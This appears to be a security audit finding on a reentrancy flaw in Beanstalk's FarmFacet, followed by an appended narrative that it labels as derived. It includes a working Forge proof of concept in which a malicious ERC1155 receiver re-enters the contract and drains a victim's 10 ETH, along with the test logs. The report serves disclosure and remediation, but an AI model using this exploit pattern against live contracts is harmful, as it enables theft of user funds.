---
id: 19235
severity: "High"
---

# `FarmFacet` functions are susceptible to the draining of intermediate value sent by the caller via reentrancy when execution is handed off to an untrusted external contract

## Description

** The `FarmFacet` enables multiple Beanstalk functions to be called in a single transaction using Farm calls. Any function stored in Beanstalk's EIP-2535 DiamondStorage can be called as a Farm call and, similar to the Pipeline calls originated in the `DepotFacet`, advanced Farm calls can be made within `FarmFacet` utilizing the "clipboard" encoding [documented](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibFunction.sol#L49-L74) in `LibFunction`.

Both [`FarmFacet::farm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L35-L45) and [`FarmFacet::advancedFarm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L53-L63) make use of the [`withEth` modifier](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L100-L107) defined as follows:

```solidity
// signals to Beanstalk functions that they should not refund Eth
// at the end of the function because the function is wrapped in a Farm function
modifier withEth() {
    if (msg.value > 0) s.isFarm = 2;
    _;
    if (msg.value > 0) {
        s.isFarm = 1;
        LibEth.refundEth();
    }
}
```

Used in conjunction with [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), within the `DepotFacet`, for example, the call is identified as originating from the `FarmFacet` if `s.isFarm == 2`. This indicates that an ETH refund should occur at the end of top-level FarmFacet function call rather than intermediate Farm calls within Beanstalk so that the value can be utilized in subsequent calls.

```solidity
function refundEth()
    internal
{
    AppStorage storage s = LibAppStorage.diamondStorage();
    if (address(this).balance > 0 && s.isFarm != 2) {
        (bool success, ) = msg.sender.call{value: address(this).balance}(
            new bytes(0)
        );
        require(success, "Eth transfer Failed.");
    }
}
```

Similar to the vulnerabilities in `DepotFacet` and `Pipeline`, `FarmFacet` Farm functions are also susceptible to the draining of intermediate value sent by the caller via reentrancy by an untrusted and malicious external contract. In this case, the attacker could be the recipient of Beanstalk Fertilizer, for example, given this is a likely candidate for an action that may be performed via `FarmFacet` functions, utilizing [`TokenSupportFacet::transferERC1155`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenSupportFacet.sol#L85-L92), and because transfers of these tokens are performed "safely" by calling [`Fertilizer1155:__doSafeTransferAcceptanceCheck`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/tokens/Fertilizer/Fertilizer1155.sol#L42) which in turn calls the `IERC1155ReceiverUpgradeable::onERC1155Received` hook on the Fertilizer recipient.

Continuing the above example, a malicious recipient could call back into the `FarmFacet` and re-enter the Farm functions via the `Fertilizer1155` safe transfer acceptance check with empty calldata and only `1 wei` of payable value. This causes the execution of the attacker's transaction to fall straight through to the refund logic, given no loop iterations occur on the empty data and the conditional blocks within the modifier are entered due to the (ever so slightly) non-zero `msg.value`. The call to `LibEth::refundEth` will succeed since s.isFarm == 1 in the attacker's context, sending the entire Diamond proxy balance. When execution continues in the context of the original caller's Farm call, it will still enter the conditional since their `msg.value` was also non-zero; however, there is no longer any ETH balance to refund, so this call will fall through without sending any value as the conditional block is not entered.

** A malicious external contract handed control of execution during the lifetime of a Farm call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.

## Proof of Concept

** The following forge test demonstrates the ability of a Fertilizer recipient, for example, to re-enter Beanstalk, draining funds remaining in the Diamond that should have been refunded to the original caller at the end of execution:

```solidity
contract FertilizerRecipient {
    bool exploited;

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        console.log("entered exploiter onERC1155Received");
        if (!exploited) {
            exploited = true;
            console.log("exploiting farm facet farm call");
            AdvancedFarmCall[] memory data = new AdvancedFarmCall[](0);
            IBeanstalk(BEANSTALK).advancedFarm{value: 1 wei}(data);
            console.log("finished exploiting farm facet farm call");
        }
        return bytes4(0xf23a6e61);
    }

    fallback() external payable {
        console.log("entered exploiter fallback");
        console.log("Beanstalk balance: ", BEANSTALK.balance);
        console.log("Exploiter balance: ", address(this).balance);
    }
}

contract FarmFacetPoC is Test {
    uint256 constant TOKEN_ID = 3445713;
    address constant VICTIM = address(0x995D1e4e2807Ef2A8d7614B607A89be096313916);
    FertilizerRecipient exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK);

        FarmFacet farmFacet = new FarmFacet();
        vm.etch(FARM_FACET, address(farmFacet).code);

        Fertilizer fert = new Fertilizer();
        vm.etch(FERTILIZER, address(fert).code);

        assertGe(IERC1155(FERTILIZER).balanceOf(VICTIM, TOKEN_ID), 1, "Victim does not have token");

        exploiter = new FertilizerRecipient();
        vm.deal(address(exploiter), 1 wei);

        vm.label(VICTIM, "VICTIM");
        vm.deal(VICTIM, 10 ether);

        vm.label(BEANSTALK, "Beanstalk Diamond");
        vm.label(FERTILIZER, "Fertilizer");
        vm.label(address(exploiter), "Exploiter");
    }

    function test_attack() public {
        emit log_named_uint("VICTIM balance before: ", VICTIM.balance);
        emit log_named_uint("BEANSTALK balance before: ", BEANSTALK.balance);
        emit log_named_uint("Exploiter balance before: ", address(exploiter).balance);

        vm.startPrank(VICTIM);
        // approve Beanstalk to transfer Fertilizer
        IERC1155(FERTILIZER).setApprovalForAll(BEANSTALK, true);

        // encode call to `TokenSupportFacet::transferERC1155`
        bytes4 selector = 0x0a7e880c;
        assertEq(IBeanstalk(BEANSTALK).facetAddress(selector), address(0x5e15667Bf3EEeE15889F7A2D1BB423490afCb527), "Incorrect facet address/invalid function");

        AdvancedFarmCall[] memory data = new AdvancedFarmCall[](1);
        data[0] = AdvancedFarmCall(abi.encodeWithSelector(selector, address(FERTILIZER), address(exploiter), TOKEN_ID, 1), abi.encodePacked(bytes1(0x00)));
        IBeanstalk(BEANSTALK).advancedFarm{value: 10 ether}(data);
        vm.stopPrank();

        emit log_named_uint("VICTIM balance after: ", VICTIM.balance);
        emit log_named_uint("BEANSTALK balance after: ", BEANSTALK.balance);
        emit log_named_uint("Exploiter balance after: ", address(exploiter).balance);
    }
}
```

As can be seen in the output below, the exploiter is able to steal the excess 10 Ether sent by the victim:

```
Running 1 test for test/FarmFacetPoC.t.sol:FarmFacetPoC
[PASS] test_attack() (gas: 183060)
Logs:
  VICTIM balance before: : 10000000000000000000
  BEANSTALK balance before: : 0
  Exploiter balance before: : 1
  data.length: 1
  entered __doSafeTransferAcceptanceCheck
  to is contract, calling hook
  entered exploiter onERC1155Received
  exploiting farm facet farm call
  data.length: 0
  entered exploiter fallback
  Beanstalk balance:  0
  Exploiter balance:  10000000000000000001
  finished exploiting farm facet farm call
  VICTIM balance after: : 0
  BEANSTALK balance after: : 0
  Exploiter balance after: : 10000000000000000001
```

## Recommendation

** Add a reentrancy guard to `FarmFacet` Farm functions.

\clearpage

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the FarmFacet contract which aggregates multiple Beanstalk functions into a single transaction using the withEth modifier. The modifier marks a call as a farm operation when msg.value is greater than zero, sets a storage flag (s.isFarm) to 2 during execution, and after the wrapped function finishes it resets the flag to 1 and invokes LibEth.refundEth. The refund function checks the flag and, if it is not equal to 2, attempts to send the entire contract balance to msg.sender. Because the flag is changed to 1 before the refund, an attacker that can trigger a re‑entrancy during an intermediate call can cause the refund to execute while the contract still holds the caller’s ETH. The re‑entrancy surface appears when a Farm call invokes an external contract that implements the ERC1155 safe‑transfer acceptance hook, such as a Fertilizer token receiver. The malicious receiver’s onERC1155Received hook can call back into FarmFacet. By sending a tiny amount of wei (e.g., 1 wei) and invoking advancedFarm with empty calldata, the attacker causes the modifier’s post‑execution block to run in the attacker’s context, sees s.isFarm == 1 and therefore triggers refundEth, which transfers the whole Diamond proxy balance to the attacker. When execution returns to the original caller’s farm call, the flag is still 1 but the contract balance is now zero, so the second refund does nothing. From a user perspective the victim sends ETH expecting it to be used for the farm operation and then refunded at the end, but instead the balance disappears and the attacker’s address receives the funds, leaving the victim with a zero ETH balance. The issue is a classic re‑entrancy bug where an intermediate value is drained because the contract performs an external call (the refund) after changing internal state but before finalizing all logic. It was discovered during a security audit and demonstrated with a Forge test that re‑enters through the ERC1155 hook. The bug is hard to notice because the refund only occurs when s.isFarm is not 2, and the flag manipulation is subtle; a small non‑zero msg.value satisfies the condition, making the exploit appear only under specific multi‑call scenarios. The vulnerability affects any user who sends ETH via farm calls, the protocol’s overall ETH reserves, and any external contract that can be called during a farm operation. To remediate, the contract should be protected with a re‑entrancy guard on all farm functions, avoid performing refunds after external calls, or redesign the refund logic to use a pull‑payment pattern that does not rely on mutable flags during execution. In essence, the bug is a re‑entrancy flaw in the refund mechanism of a composable multi‑call facet, allowing an attacker to siphon intermediate ETH that should have been returned to the original caller.
